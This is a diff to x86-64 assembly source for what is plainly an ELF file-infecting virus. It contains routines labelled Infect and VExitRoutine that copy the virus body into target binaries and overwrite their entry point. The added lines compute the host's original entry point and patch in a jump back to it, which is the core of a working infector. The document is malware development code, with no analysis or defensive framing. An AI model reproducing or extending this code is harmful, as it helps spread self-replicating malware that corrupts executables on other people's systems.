@@ -90,6 +90,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add     rsp,  SZ_DENT
   pop     rdi
   Close   [rsp]
+  mov     rsp,  r15
   jmp     VExitRoutine
 
 Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
@@ -223,13 +224,30 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   push  rdi
 
   mov   rsi, _start         ; source address
-  mov   rdi, [rsp+0x28]     ; destination address
+  mov   rdi, [rsp + 0x28]   ; destination address
   rep   movsb
 
   pop   rdi
   add   rsp,  0x8
 
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
+
+  ; NewEntry = GetRip() - (V_SIZE + 5) - V_Entry + OEP
+  call  GetRip                ; GetRip()
+  mov   rbx,  _start
+  mov   rcx,  VExitRoutine
+  sub   rcx,  rbx             ; V_Size
+  add   rcx,  0x5             ; V_Size + 5
+  sub   rax,  rcx             ; RIP - (V_Size+5)
+  lea   rbx,  [rsp + 0x18]
+  sub   rax,  [rbx + elf64_phdr.p_vaddr]
+  add   rax,  [rsp + 0x10]
+
+  ; patch the jmp
+  lea   rbx,  [rsp]   
+  mov   byte  [rbx + rcx],  0xe9  ; jmp
+  inc   rcx
+  mov   dword [rbx + rcx],  eax   ; addr
 
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
@@ -288,5 +306,10 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   pop     rbp
   ret
 
+GetRip:
+  mov     rax,  [rsp]
+  ret
+
 VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   Exit 0x00
+
